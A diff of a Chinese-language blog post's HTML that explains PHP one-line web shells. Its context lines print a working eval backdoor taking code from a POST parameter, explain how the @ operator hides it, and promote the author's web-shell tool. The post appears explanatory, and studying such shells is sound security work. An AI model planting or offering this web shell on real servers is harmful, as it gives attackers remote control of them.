@@ -30,7 +30,7 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 </ul>
 <p>這邊推一下我自己寫的Alien<br><a target="_blank" rel="noopener" href="https://malbuffer4pt.github.io/Alien">https://malbuffer4pt.github.io/Alien</a></p>
 <hr>
-<h1 id="一句話木馬的程式"><a href="#一句話木馬的程式" class="headerlink" title="一句話木馬的程式"></a>一句話木馬的程式</h1><p>在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器<br>如下圖 (工具: Alien)<br><img src="/pic/oneshell/1.png"></p>
+<h1 id="一句話木馬的程式"><a href="#一句話木馬的程式" class="headerlink" title="一句話木馬的程式"></a>一句話木馬的程式</h1><p>在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器<br>如下圖 (工具: Alien)<br class='item-img' data-src='/pic/oneshell/1.png'><img src="/pic/oneshell/1.png"></p>
 <p>以php為例，PHP一句話木馬為  </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
 <p>$_POST[‘pass’] : 取得HTTP POST參數為pass的Data<br>@eval($str); : 把 $str 以PHP Code執行  , @ 代表如果 $str &#x3D;&#x3D; null時就不顯示結果(這樣就增加了隱密性。)<br>所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 :   </p>
